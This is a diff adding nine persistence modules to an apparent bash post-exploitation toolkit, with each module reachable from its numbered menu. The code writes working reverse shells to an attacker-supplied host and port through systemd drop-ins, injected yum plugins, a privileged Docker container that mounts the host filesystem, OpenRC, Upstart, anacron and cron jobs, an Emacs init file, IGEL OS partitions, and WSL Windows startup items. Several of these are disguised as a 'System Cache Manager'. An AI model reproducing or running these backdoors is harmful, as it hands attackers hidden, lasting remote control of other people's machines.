@@ -3907,6 +3907,251 @@ nsStashspace(){
     esac
 }
 
+systemdOverride(){
+    echo " [*] SystemD Drop-in Override Persistence (T1543.002) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_override"
+    echo -e "  [1] Install override (revshell)  [2] Custom command  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            echo "Running services:"; systemctl list-units --type=service --state=running --no-pager 2>/dev/null | grep '.service' | awk '{print "  "$1}' | head -15
+            read -p "Service [ssh]: " SVC; SVC="${SVC:-ssh}"
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+            systemctl cat "${SVC}.service" >/dev/null 2>&1 || { echo "[-] Service not found"; return; }
+            mkdir -p "/etc/systemd/system/${SVC}.service.d"
+            printf "# ${MARKER}\n[Service]\nExecStartPost=/bin/sh -c 'nohup /bin/bash -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\" >/dev/null 2>&1 &'\n" > "/etc/systemd/system/${SVC}.service.d/override.conf"
+            systemctl daemon-reload 2>/dev/null
+            echo -e "${GREEN}[+] Override installed for ${SVC}${NC}" ;;
+        2)
+            read -p "Service [ssh]: " SVC; SVC="${SVC:-ssh}"; read -p "Command: " CMD
+            systemctl cat "${SVC}.service" >/dev/null 2>&1 || { echo "[-] Service not found"; return; }
+            mkdir -p "/etc/systemd/system/${SVC}.service.d"
+            printf "# ${MARKER}\n[Service]\nExecStartPost=/bin/sh -c '${CMD} &'\n" > "/etc/systemd/system/${SVC}.service.d/override.conf"
+            systemctl daemon-reload 2>/dev/null; echo -e "${GREEN}[+] Installed${NC}" ;;
+        3) find /etc/systemd/system -name 'override.conf' -exec grep -l "$MARKER" {} \; 2>/dev/null ;;
+        4) find /etc/systemd/system -name 'override.conf' -exec grep -l "$MARKER" {} \; 2>/dev/null | while read -r f; do rm -f "$f"; rmdir "$(dirname "$f")" 2>/dev/null; done; systemctl daemon-reload 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+yumBackdoor(){
+    echo " [*] Yum/DNF Plugin Backdoor (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_yum"
+    command -v yum >/dev/null 2>&1 || command -v dnf >/dev/null 2>&1 || { echo "[-] yum/dnf not found"; return; }
+    echo -e "  [1] Install (revshell)  [2] Custom  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+            PLUG_DIR="/usr/lib/yum-plugins"; read -p "Plugin [fastestmirror.py]: " PL; PL="${PL:-fastestmirror.py}"
+            PF="${PLUG_DIR}/${PL}"
+            [[ -f "$PF" ]] && grep -q 'import os' "$PF" || { echo "[-] Plugin not found or no import os"; return; }
+            cp "$PF" "${PF}.d3m0n.bak"
+            sed -i "/import os/a\\# ${MARKER}\nos.system('setsid /bin/bash -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\" 2>/dev/null &')" "$PF"
+            rm -f "${PF}c" 2>/dev/null; echo -e "${GREEN}[+] Injected into ${PF}${NC}" ;;
+        2)
+            read -p "Plugin path: " PF; read -p "Command: " CMD
+            [[ -f "$PF" ]] || { echo "[-] Not found"; return; }
+            cp "$PF" "${PF}.d3m0n.bak"
+            sed -i "/import os/a\\# ${MARKER}\nos.system('setsid ${CMD} 2>/dev/null &')" "$PF"
+            echo -e "${GREEN}[+] Injected${NC}" ;;
+        3) grep -rl "$MARKER" /usr/lib/yum-plugins/ 2>/dev/null ;;
+        4) for bak in /usr/lib/yum-plugins/*.d3m0n.bak; do [[ -f "$bak" ]] && mv "$bak" "${bak%.d3m0n.bak}"; done; echo "[+] Cleaned" ;;
+    esac
+}
+
+dockerPersist(){
+    echo " [*] Docker Container Persistence (T1610) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    MARKER="d3m0n_docker"
+    command -v docker >/dev/null 2>&1 || { echo "[-] Docker not installed"; return; }
+    docker ps >/dev/null 2>&1 || { echo "[-] Docker not accessible"; return; }
+    echo -e "  [1] Deploy (revshell)  [2] Custom  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT; read -p "Sleep [600]: " SLP; SLP="${SLP:-600}"
+            CN="d3m0n_$(head -c 4 /dev/urandom | xxd -p)"
+            docker pull alpine:latest 2>&1 | tail -1
+            ENTRY=$(mktemp); printf '#!/bin/sh\nwhile true; do /bin/sh -c "nohup sh -i >& /dev/tcp/%s/%s 0>&1 2>/dev/null" & wait $!; sleep %s; done\n' "$LHOST" "$LPORT" "$SLP" > "$ENTRY"
+            TMP="${CN}_tmp"; docker create --name "$TMP" alpine:latest /bin/sh >/dev/null 2>&1
+            docker cp "$ENTRY" "${TMP}:/entrypoint.sh" 2>/dev/null; docker start "$TMP" >/dev/null 2>&1; docker exec "$TMP" chmod +x /entrypoint.sh 2>/dev/null
+            IMG="${MARKER}_$(head -c 4 /dev/urandom | xxd -p)"; docker commit "$TMP" "$IMG" >/dev/null 2>&1; docker rm -f "$TMP" >/dev/null 2>&1
+            CID=$(docker run -dit --name "$CN" --privileged -v /:/host --restart=always --label "${MARKER}=true" "$IMG" /entrypoint.sh 2>&1)
+            rm -f "$ENTRY"; echo -e "${GREEN}[+] Container: ${CN}, loops every ${SLP}s${NC}" ;;
+        2)
+            read -p "Command: " CMD; read -p "Sleep [600]: " SLP; SLP="${SLP:-600}"
+            CN="d3m0n_$(head -c 4 /dev/urandom | xxd -p)"
+            docker pull alpine:latest 2>&1 | tail -1
+            ENTRY=$(mktemp); printf '#!/bin/sh\nwhile true; do %s & wait $!; sleep %s; done\n' "$CMD" "$SLP" > "$ENTRY"
+            TMP="${CN}_tmp"; docker create --name "$TMP" alpine:latest /bin/sh >/dev/null 2>&1
+            docker cp "$ENTRY" "${TMP}:/entrypoint.sh" 2>/dev/null; docker start "$TMP" >/dev/null 2>&1; docker exec "$TMP" chmod +x /entrypoint.sh 2>/dev/null
+            IMG="${MARKER}_$(head -c 4 /dev/urandom | xxd -p)"; docker commit "$TMP" "$IMG" >/dev/null 2>&1; docker rm -f "$TMP" >/dev/null 2>&1
+            docker run -dit --name "$CN" --privileged -v /:/host --restart=always --label "${MARKER}=true" "$IMG" /entrypoint.sh >/dev/null 2>&1
+            rm -f "$ENTRY"; echo -e "${GREEN}[+] Container: ${CN}${NC}" ;;
+        3) docker ps -a --filter "label=${MARKER}=true" --format "  {{.Names}}\t{{.Status}}" 2>/dev/null ;;
+        4) docker ps -a --filter "label=${MARKER}=true" --format "{{.Names}}" 2>/dev/null | while read -r c; do docker rm -f "$c" 2>/dev/null; done
+            docker images --format "{{.Repository}}" 2>/dev/null | grep "^${MARKER}" | while read -r i; do docker rmi -f "$i" 2>/dev/null; done; echo "[+] Cleaned" ;;
+    esac
+}
+
+openrcPersist(){
+    echo " [*] OpenRC Service Persistence (T1543) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_openrc"
+    command -v rc-update >/dev/null 2>&1 || { echo "[-] OpenRC not found"; return; }
+    echo -e "  [1] Install (revshell)  [2] Custom  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "Service name [syslogcache]: " SVC; SVC="${SVC:-syslogcache}"
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+            printf '#!/sbin/openrc-run\n# %s\nname="%s"\ndescription="System Cache Manager"\ncommand="/bin/sh"\ncommand_args="-c \x27nohup /bin/sh -c \x27\x27while true; do sh -i >& /dev/tcp/%s/%s 0>&1 2>/dev/null; sleep 60; done\x27\x27 &\x27"\ncommand_background="yes"\npidfile="/run/%s.pid"\ndepend() { need net; }\n' "$MARKER" "$SVC" "$LHOST" "$LPORT" "$SVC" > "/etc/init.d/${SVC}"
+            chmod 755 "/etc/init.d/${SVC}"; rc-update add "$SVC" default 2>/dev/null; echo -e "${GREEN}[+] Installed${NC}" ;;
+        2)
+            read -p "Service name [syslogcache]: " SVC; SVC="${SVC:-syslogcache}"; read -p "Command: " CMD
+            printf '#!/sbin/openrc-run\n# %s\nname="%s"\ndescription="System Cache Manager"\ncommand="/bin/sh"\ncommand_args="-c \x27%s\x27"\ncommand_background="yes"\npidfile="/run/%s.pid"\ndepend() { need net; }\n' "$MARKER" "$SVC" "$CMD" "$SVC" > "/etc/init.d/${SVC}"
+            chmod 755 "/etc/init.d/${SVC}"; rc-update add "$SVC" default 2>/dev/null; echo -e "${GREEN}[+] Installed${NC}" ;;
+        3) grep -rl "$MARKER" /etc/init.d/ 2>/dev/null ;;
+        4) grep -rl "$MARKER" /etc/init.d/ 2>/dev/null | while read -r f; do s=$(basename "$f"); rc-service "$s" stop 2>/dev/null; rc-update del "$s" default 2>/dev/null; rm -f "$f"; done; echo "[+] Cleaned" ;;
+    esac
+}
+
+upstartPersist(){
+    echo " [*] Upstart Service Persistence (T1543) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_upstart"
+    command -v initctl >/dev/null 2>&1 || { echo "[-] Upstart not found"; return; }
+    echo -e "  [1] Install (revshell)  [2] Custom  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "Job name [system-cache]: " JOB; JOB="${JOB:-system-cache}"
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+            printf '# %s\ndescription "System Cache Manager"\nstart on runlevel [2345]\nstop on runlevel [!2345]\nrespawn\nrespawn limit 10 5\nexec /bin/sh -c "while true; do /bin/bash -i >& /dev/tcp/%s/%s 0>&1 2>/dev/null; sleep 60; done"\n' "$MARKER" "$LHOST" "$LPORT" > "/etc/init/${JOB}.conf"
+            initctl reload-configuration 2>/dev/null; echo -e "${GREEN}[+] Job installed: ${JOB}${NC}" ;;
+        2)
+            read -p "Job name [system-cache]: " JOB; JOB="${JOB:-system-cache}"; read -p "Command: " CMD
+            printf '# %s\ndescription "System Cache Manager"\nstart on runlevel [2345]\nstop on runlevel [!2345]\nrespawn\nexec %s\n' "$MARKER" "$CMD" > "/etc/init/${JOB}.conf"
+            initctl reload-configuration 2>/dev/null; echo -e "${GREEN}[+] Installed${NC}" ;;
+        3) grep -rl "$MARKER" /etc/init/ 2>/dev/null ;;
+        4) grep -rl "$MARKER" /etc/init/ 2>/dev/null | while read -r f; do j=$(basename "${f%.conf}"); initctl stop "$j" 2>/dev/null; rm -f "$f"; done; initctl reload-configuration 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+emacsPersist(){
+    echo " [*] Emacs Extension Persistence (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    MARKER="d3m0n_emacs"
+    echo -e "  [1] Install (revshell)  [2] Custom  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+            HD=$(getent passwd "$USR" 2>/dev/null | cut -d: -f6); [[ -z "$HD" ]] && { echo "[-] User not found"; return; }
+            mkdir -p "${HD}/.emacs.d/lisp"
+            printf ';;; d3m0n-helper.el --- %s\n(defun d3m0n-system-init () (start-process "sys-cache" nil "/bin/sh" "-c" "nohup /bin/bash -c \x27bash -i >& /dev/tcp/%s/%s 0>&1\x27 >/dev/null 2>&1 &"))\n(d3m0n-system-init)\n(provide \x27d3m0n-helper)\n' "$MARKER" "$LHOST" "$LPORT" > "${HD}/.emacs.d/lisp/d3m0n-helper.el"
+            if ! grep -q "$MARKER" "${HD}/.emacs.d/init.el" 2>/dev/null; then
+                [[ -f "${HD}/.emacs.d/init.el" ]] && cp "${HD}/.emacs.d/init.el" "${HD}/.emacs.d/init.el.d3m0n.bak"
+                printf '\n;; %s\n(add-to-list \x27load-path "~/.emacs.d/lisp")\n(require \x27d3m0n-helper)\n' "$MARKER" >> "${HD}/.emacs.d/init.el"
+            fi
+            chown -R "${USR}:" "${HD}/.emacs.d" 2>/dev/null; echo -e "${GREEN}[+] Installed for ${USR}${NC}" ;;
+        2)
+            read -p "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"; read -p "Command: " CMD
+            HD=$(getent passwd "$USR" 2>/dev/null | cut -d: -f6); [[ -z "$HD" ]] && { echo "[-] User not found"; return; }
+            mkdir -p "${HD}/.emacs.d/lisp"
+            printf ';;; d3m0n-helper.el --- %s\n(defun d3m0n-system-init () (start-process "sys-cache" nil "/bin/sh" "-c" "%s"))\n(d3m0n-system-init)\n(provide \x27d3m0n-helper)\n' "$MARKER" "$CMD" > "${HD}/.emacs.d/lisp/d3m0n-helper.el"
+            if ! grep -q "$MARKER" "${HD}/.emacs.d/init.el" 2>/dev/null; then
+                printf '\n;; %s\n(add-to-list \x27load-path "~/.emacs.d/lisp")\n(require \x27d3m0n-helper)\n' "$MARKER" >> "${HD}/.emacs.d/init.el"
+            fi
+            chown -R "${USR}:" "${HD}/.emacs.d" 2>/dev/null; echo -e "${GREEN}[+] Installed${NC}" ;;
+        3) find /home /root -name 'd3m0n-helper.el' 2>/dev/null ;;
+        4) find /home /root -name 'd3m0n-helper.el' -delete 2>/dev/null; find /home /root -name 'init.el.d3m0n.bak' 2>/dev/null | while read -r f; do mv "$f" "${f%.d3m0n.bak}"; done; echo "[+] Cleaned" ;;
+    esac
+}
+
+igelPersist(){
+    echo " [*] IGEL OS Persistence (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_igel"
+    [[ -d /etc/igel ]] || [[ -f /config/sessions/setup.ini ]] || { echo "[-] Not IGEL OS"; return; }
+    echo -e "  [1] /license partition  [2] Registry (setparam)  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+            mount -o remount,rw /license 2>/dev/null || { echo "[-] Can't remount"; return; }
+            printf '#!/bin/sh\n# %s\nnohup /bin/sh -c "while true; do /bin/sh -i >& /dev/tcp/%s/%s 0>&1 2>/dev/null; sleep 60; done" &\n' "$MARKER" "$LHOST" "$LPORT" > /license/.d3m0n_persist
+            chmod 755 /license/.d3m0n_persist; mount -o remount,ro /license 2>/dev/null; echo -e "${GREEN}[+] Written to /license/${NC}" ;;
+        2)
+            read -p "Command: " CMD
+            command -v setparam >/dev/null 2>&1 || { echo "[-] setparam not found"; return; }
+            B64=$(echo "$CMD" | base64 -w0)
+            setparam "userinterface.rccustom.custom_cmd_net_final" "echo '${B64}' | base64 -d | /bin/sh" 2>/dev/null && echo -e "${GREEN}[+] Registry set${NC}" ;;
+        3) mount -o remount,rw /license 2>/dev/null; rm -f /license/.d3m0n_persist; mount -o remount,ro /license 2>/dev/null
+            command -v setparam >/dev/null 2>&1 && setparam "userinterface.rccustom.custom_cmd_net_final" "" 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+wslPersist(){
+    echo " [*] WSL Startup Folder Persistence (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    MARKER="d3m0n_wsl"
+    grep -qi 'microsoft\|wsl' /proc/version 2>/dev/null || { echo "[-] Not WSL"; return; }
+    command -v wslpath >/dev/null 2>&1 || { echo "[-] wslpath not found"; return; }
+    echo -e "  [1] VBS in Startup  [2] BAT in Startup  [3] Scheduled Task  [4] Cleanup"
+    read -p "Choice: " OPT
+    APPDATA=$(cmd.exe /C 'echo %APPDATA%' 2>/dev/null | tr -d '\r')
+    STARTUP=$(wslpath "${APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>/dev/null)
+    DISTRO=$(wsl.exe -l -q 2>/dev/null | head -1 | tr -d '\0\r' || echo "Ubuntu")
+    case "$OPT" in
+        1) read -p "Payload: " PL; printf "' %s\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run \"wsl.exe -d %s -- /bin/sh -c '%s'\", 0, False\n" "$MARKER" "$DISTRO" "$PL" > "${STARTUP}/SystemCacheHelper.vbs"; echo -e "${GREEN}[+] VBS installed${NC}" ;;
+        2) read -p "Payload: " PL; printf "@echo off\nREM %s\nstart /b wsl.exe -d %s -- /bin/sh -c \"%s\"\n" "$MARKER" "$DISTRO" "$PL" > "${STARTUP}/SystemCacheHelper.bat"; echo -e "${GREEN}[+] BAT installed${NC}" ;;
+        3) read -p "Payload: " PL; cmd.exe /C "schtasks /Create /TN \"SystemCacheHelper\" /TR \"wsl.exe -d ${DISTRO} -- /bin/sh -c '${PL}'\" /SC ONLOGON /RL HIGHEST /F" 2>/dev/null && echo -e "${GREEN}[+] Task created${NC}" ;;
+        4) rm -f "${STARTUP}"/SystemCacheHelper.* 2>/dev/null; cmd.exe /C 'schtasks /Delete /TN "SystemCacheHelper" /F' 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+periodicPersist(){
+    echo " [*] Periodic/Anacron Script Persistence (T1053) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_periodic"
+    echo -e "  [1] Install (revshell)  [2] Custom  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "LHOST: " LHOST; read -p "LPORT: " LPORT; read -p "Interval [daily]: " INT; INT="${INT:-daily}"
+            PL="nohup /bin/sh -c '/bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &"
+            if [[ -d /etc/periodic ]]; then
+                mkdir -p "/etc/periodic/${INT}"; printf '#!/bin/sh\n# %s\n%s\nexit 0\n' "$MARKER" "$PL" > "/etc/periodic/${INT}/999.d3m0n-persist"; chmod 755 "/etc/periodic/${INT}/999.d3m0n-persist"
+            elif [[ -d "/etc/cron.${INT}" ]]; then
+                printf '#!/bin/sh\n# %s\n%s\n' "$MARKER" "$PL" > "/etc/cron.${INT}/d3m0n-persist"; chmod 755 "/etc/cron.${INT}/d3m0n-persist"
+            elif [[ -f /etc/anacrontab ]]; then
+                SC="/usr/local/bin/.d3m0n-periodic"; printf '#!/bin/sh\n# %s\n%s\n' "$MARKER" "$PL" > "$SC"; chmod 755 "$SC"
+                D=1; [[ "$INT" == "weekly" ]] && D=7; [[ "$INT" == "monthly" ]] && D=30
+                echo "# ${MARKER}" >> /etc/anacrontab; echo "${D}	15	d3m0n-persist	${SC}" >> /etc/anacrontab
+            fi; echo -e "${GREEN}[+] Installed (${INT})${NC}" ;;
+        2)
+            read -p "Command: " CMD; read -p "Interval [daily]: " INT; INT="${INT:-daily}"
+            if [[ -d /etc/periodic ]]; then
+                mkdir -p "/etc/periodic/${INT}"; printf '#!/bin/sh\n# %s\n%s\nexit 0\n' "$MARKER" "$CMD" > "/etc/periodic/${INT}/999.d3m0n-persist"; chmod 755 "/etc/periodic/${INT}/999.d3m0n-persist"
+            elif [[ -d "/etc/cron.${INT}" ]]; then
+                printf '#!/bin/sh\n# %s\n%s\n' "$MARKER" "$CMD" > "/etc/cron.${INT}/d3m0n-persist"; chmod 755 "/etc/cron.${INT}/d3m0n-persist"
+            fi; echo -e "${GREEN}[+] Installed${NC}" ;;
+        3) find /etc/periodic /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -name '*d3m0n*' 2>/dev/null; grep "$MARKER" /etc/anacrontab 2>/dev/null ;;
+        4) find /etc/periodic /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -name '*d3m0n*' -delete 2>/dev/null; rm -f /usr/local/bin/.d3m0n-periodic
+            [[ -f /etc/anacrontab ]] && sed -i "/${MARKER}/d; /d3m0n-persist/d" /etc/anacrontab; echo "[+] Cleaned" ;;
+    esac
+}
+
 banner() {
     :
 }
@@ -3978,6 +4223,17 @@ menu() {
                                   [64] Modprobe.d Event Hijacking (T1547.006)
                                   [65] GRUB Bootloader Backdoor (T1542)
                                   [66] Mount Namespace Stashspace (T1564.001)
+
+                                  ═══ Metasploit-Sourced Techniques ═══
+                                  [67] SystemD Drop-in Override (T1543.002)
+                                  [68] Yum/DNF Plugin Backdoor (T1546)
+                                  [69] Docker Container Persistence (T1610)
+                                  [70] OpenRC Service Persistence (T1543)
+                                  [71] Upstart Service Persistence (T1543)
+                                  [72] Emacs Extension Persistence (T1546)
+                                  [73] IGEL OS Persistence (T1546)
+                                  [74] WSL Startup Folder Persistence (T1546)
+                                  [75] Periodic/Anacron Persistence (T1053)
 
     [*] Coming soon others features [*]
 
@@ -4119,6 +4375,24 @@ EOF
         grubBackdoor
     elif [ "$MENUINPUT" == "66" ] || [ "$MENUINPUT" == "66" ]; then
         nsStashspace
+    elif [ "$MENUINPUT" == "67" ] || [ "$MENUINPUT" == "67" ]; then
+        systemdOverride
+    elif [ "$MENUINPUT" == "68" ] || [ "$MENUINPUT" == "68" ]; then
+        yumBackdoor
+    elif [ "$MENUINPUT" == "69" ] || [ "$MENUINPUT" == "69" ]; then
+        dockerPersist
+    elif [ "$MENUINPUT" == "70" ] || [ "$MENUINPUT" == "70" ]; then
+        openrcPersist
+    elif [ "$MENUINPUT" == "71" ] || [ "$MENUINPUT" == "71" ]; then
+        upstartPersist
+    elif [ "$MENUINPUT" == "72" ] || [ "$MENUINPUT" == "72" ]; then
+        emacsPersist
+    elif [ "$MENUINPUT" == "73" ] || [ "$MENUINPUT" == "73" ]; then
+        igelPersist
+    elif [ "$MENUINPUT" == "74" ] || [ "$MENUINPUT" == "74" ]; then
+        wslPersist
+    elif [ "$MENUINPUT" == "75" ] || [ "$MENUINPUT" == "75" ]; then
+        periodicPersist
     else 
         echo "This option does not exist"
     fi
